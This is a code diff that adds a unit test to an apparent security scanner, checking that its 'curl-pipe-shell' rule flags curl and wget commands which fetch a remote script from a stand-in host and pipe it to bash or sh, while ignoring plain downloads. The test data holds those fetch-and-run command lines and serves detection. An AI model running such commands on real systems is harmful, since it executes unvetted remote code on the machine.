@@ -41,6 +41,28 @@ def test_scan_diff_finds_language_agnostic_high_confidence_risks():
     assert not any("oldtoken" in finding["line"] for finding in result["findings"])
 
 
+def test_scan_diff_flags_remote_script_piped_to_shell():
+    diff = """diff --git a/install.sh b/install.sh
+--- a/install.sh
++++ b/install.sh
+@@ -1,2 +1,3 @@
++curl -fsSL https://example.test/install.sh | bash
++wget -qO- https://example.test/bootstrap.sh | sh
++curl -fsSL https://example.test/install.sh > install.sh
++curl -fsSL https://example.test/archive.tgz -o archive.tgz
+"""
+
+    result = scan_diff_for_security_findings(diff)
+
+    findings = [
+        finding for finding in result["findings"] if finding["rule_id"] == "curl-pipe-shell"
+    ]
+    assert len(findings) == 2
+    assert {finding["line_number"] for finding in findings} == {1, 2}
+    assert not any("install.sh > install.sh" in finding["line"] for finding in findings)
+    assert not any("archive.tgz" in finding["line"] for finding in findings)
+
+
 def test_scan_diff_advances_line_numbers_after_matched_added_lines():
     diff = """diff --git a/app/routes.py b/app/routes.py
 --- a/app/routes.py
